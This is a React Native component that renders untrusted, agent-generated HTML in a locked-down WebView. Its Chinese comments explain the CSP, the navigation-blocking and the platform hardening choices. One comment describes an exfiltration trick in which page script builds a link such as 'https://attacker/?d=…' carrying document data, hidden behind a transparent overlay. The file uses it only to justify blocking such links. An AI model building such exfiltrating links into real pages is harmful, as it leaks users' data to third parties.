/**
 * 全屏 HTML 阅读器(文件预览的「渲染态」)。
 *
 * agent 产出的 HTML 报告 / 设计稿属于跨端生成物:桌面端点开就进系统浏览器或侧边栏
 * 浏览器(shared/browserOpenableExts),手机端此前只能看源码 —— HTML 落在共享层的
 * SUPPORTED_TEXT_EXTS 里,预览页按文本分派成行号列表。这里补齐渲染态。
 *
 * **不走 OSS 导出,直接把已读到的文本喂 WebView**:
 *   - 取件复用文本预览那条通道(workdir 内 fileBrowser.readFile / workdir 外
 *     text-file:read-preview),一次读取同时服务渲染态与源码态 —— 不为渲染多传一遍
 *     字节、不留 OSS 临时对象、桌面离线时已读过的内容仍在页内;
 *   - 载体是 `source={{ html }}`,origin 为 about:blank(null origin),权限面比桌面
 *     用 `file://` 打开更小。
 *
 * 已知边界:单文件取件不带同目录资源,相对引用的 CSS / JS / 图片解析不到 —— 自包含
 * 页面(内联样式与脚本、`data:` 图)完整可读;多文件站点式产物会缺资源,退路是工具栏
 * 「分享」把文件送到电脑上看。桌面靠 `file://` 的同目录天然没有这个问题。
 * 公网 https 图片 / 字体同样不加载 —— 那是 CSP 关掉出网的代价(见 htmlPreviewCsp)。
 *
 * 导航一律拦下:只有 `about:`(文档自身与页内锚点)放行,**其余一切明确拒绝,且不交给
 * Linking** —— 包含用户主动点击的 http(s) 外链(理由见 interceptHtmlNavigation)。
 * 出网由 htmlPreviewCsp 在引擎层封锁(导航回调管不到子资源请求)。
 * ⚠️ **不要把这套说成「零出网」**:WebRTC 不受 CSP 管辖,iOS 上仍是残留信道 ——
 * 准确边界与待裁决的取舍见 htmlPreviewCsp 头注的「残留信道」一节。
 * 不挂 onMessage:页面里的 postMessage 无人消费,不给任意生成物开一条通向 RN 侧的通道。
 * Android 另关多窗口:`window.open` / `target="_blank"` 走的是 onCreateWindow,不经过下面
 * 的导航回调,不关掉等于给策略留一个后门(见 setSupportMultipleWindows 处的说明)。
 *
 * ⚠️ `originWhitelist` 必须是 `['*']`,不能收窄成 `['about:blank']`(review P2 实捉):
 * RNW 的 originWhitelist 在 `onShouldStartLoadWithRequest` **之前**生效,被它拒掉的 URL
 * 会被 RNW 交给 RN `Linking` 试着让系统处理 —— 于是 `tel:` / `mailto:` / 自定义 scheme
 * 会拉起外部应用,把下面这段策略整个绕过去。放到 `['*']` 之后,回调是唯一决策点。
 */
import { useMemo } from 'react';
import { StyleSheet, View } from 'react-native';
import { WebView } from 'react-native-webview';
import type { ShouldStartLoadRequest } from 'react-native-webview/lib/WebViewTypes';

import { withHtmlPreviewCsp } from '@/session/htmlPreviewCsp';

export function HtmlFileReader({ html, testID }: { html: string; testID?: string }) {
  // CSP 注入放在**渲染载体这一层**,而不是取件那一层:任何进到这个 WebView 的
  // HTML 都必须带策略,不管它有没有同目录资源(见 htmlPreviewCsp 的说明)。
  const guardedHtml = useMemo(() => withHtmlPreviewCsp(html), [html]);
  return (
    <View style={styles.fill} testID={testID}>
      <WebView
        onShouldStartLoadWithRequest={interceptHtmlNavigation}
        // 见头注:收窄会让 RNW 在回调前把非白名单 URL 交给 Linking,绕过下面的策略。
        originWhitelist={['*']}
        scrollEnabled
        // Android:关掉多窗口(review P1)。留着默认支持时,`window.open(...)` 与
        // `target="_blank"` 会走 onCreateWindow 而**不经过** onShouldStartLoadWithRequest,
        // 于是程序化打开 https 或自定义 scheme 能整个绕过上面的 click 门与 scheme 拒绝。
        // 与仓内其它本地 HTML WebView 一致(mathWebView / mermaidWebView /
        // AnnotationBurnInWebView / ComposerRichInput 都设了这一项)。
        setSupportMultipleWindows={false}
        // Android:关掉 WebView 的 file:// 读取能力(review)。页面是不可信内容,默认允许
        // 时它能用子资源 / iframe 去探测甚至读取 app 沙盒内的本地文件。与仓内
        // ComposerRichInput 一致。(allowFileAccessFromFileURLs /
        // allowUniversalAccessFromFileURLs 默认已为 false,不需显式声明。)
        allowFileAccess={false}
        // iOS:不可信页面不得弹摄像头 / 麦克风权限框,一律拒绝(review 相邻发现)。
        // ⚠️ 这**不是** WebRTC 外传的解 —— 纯数据通道与 STUN 候选收集都不需要媒体权限,
        // 见 htmlPreviewCsp 头注的「残留信道」一节。
        mediaCapturePermissionGrantType="deny"
        // baseUrl 显式给 about:blank,**不能省**:两端默认值不一致 —— iOS
        // (RNCWebViewImpl.m)缺省就是 about:blank,Android(RNCWebViewManagerImpl.kt)
        // 缺省传的是空串给 loadDataWithBaseURL。空串下页内锚点(`<a href="#toc">`)
        // 解析出的 URL 不以 `about:` 开头,会被下面的导航拦截当成外部跳转吞掉,
        // 于是目录锚点在 Android 上点了没反应。显式对齐后两端都解析成
        // `about:blank#toc`,锚点放行、origin 仍是 opaque(不放宽权限面)。
        source={{ baseUrl: 'about:blank', html: guardedHtml }}
        style={styles.fill}
      />
    </View>
  );
}

/**
 * 唯一的导航决策点(originWhitelist 已放到 `['*']`,所有请求都会先到这里)。
 *
 * 两档,默认拒绝:
 *  - `about:` —— 文档自身(`source={{ baseUrl: 'about:blank' }}`)与页内锚点,放行;
 *  - **其余一切** —— 拒绝,且**不调 Linking**(不 import 它,守卫用例钉住)。
 *
 * ── 为什么连「用户点击的 http(s) 外链」也不放(review P1,曾经放过) ──────────
 * 页面里的 JavaScript 是开启的(CSP 允许 `script-src 'unsafe-inline'`,不然自包含产物的
 * 交互全废),而作者脚本能读到整份文档 —— 包括栈上一层内联进来的同目录资源字节。它可以把
 * 这些内容拼进一个真实的 `<a href="https://attacker/?d=…">`(甚至铺一层全屏透明覆盖层),
 * 用户随手一点就命中 `navigationType === 'click'`——数据在用户看见浏览器之前就已经发出去了。
 *
 * **CSP 挡不住这条**:它管子资源与表单(`connect-src` / `img-src` / `form-action`),
 * 顶层导航不在其控制范围内(`navigate-to` 指令已从 CSP3 移除,两端都不实现)。所以
 * 「点击门」只能挡住程序化导航,挡不住脚本**构造出的、由用户点击触发**的 URL。
 *
 * 两条候选补救都不划算:
 *  - **弹确认框**:要用户对着一条 2KB base64 的 URL 判断安全性,是安全剧场;
 *  - **静态 href 白名单**(只放原文里字面存在的 URL):挡得住,但要引入 URL 归一化
 *    (HTML 实体、百分号编码、尾斜杠),归一化对不上就变成「合法外链静默点不开」。
 * 而这条能力**本来就只在 iOS 上存在** —— Android 侧 RNW 的 `createWebViewEvent` 根本不设
 * `navigationType`,那边一直拿不准、一直是拒绝。删掉它是把两端对齐,不是砍掉一个统一功能。
 *
 * 与本 PR 已经接受的取舍也一致:CSP 让公网 https 图片 / 字体在预览里不加载,预览本就不联网;
 * 在那个前提下还留一条**用户可触发**的外送信道没有道理。外链的退路是工具栏「分享」把文件
 * 送到电脑或浏览器里打开,或切「源码」态自己看 URL。
 */
function interceptHtmlNavigation(request: ShouldStartLoadRequest): boolean {
  const url = request.url ?? '';
  if (url === 'about:blank' || url.startsWith('about:')) return true;
  return false;
}

const styles = StyleSheet.create({
  fill: { flex: 1 },
});
